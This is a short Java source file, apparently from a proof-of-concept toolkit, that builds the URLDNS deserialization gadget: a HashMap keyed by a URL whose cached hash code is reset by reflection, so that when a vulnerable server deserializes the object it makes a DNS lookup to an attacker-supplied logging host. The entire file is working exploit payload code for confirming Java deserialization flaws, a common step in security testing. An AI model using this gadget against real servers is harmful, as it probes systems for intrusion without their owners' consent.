package org.n1es.poc;


import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class URLDNS {

	public static Object getObject(String dnslog) throws Exception {
		HashMap<URL, Integer> map = new HashMap<>();
		URL                   url = new URL(dnslog);
		Field                 f   = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);
		f.set(url, 1);
		map.put(url, 123);
		f.set(url, -1);

		return map;
	}
}
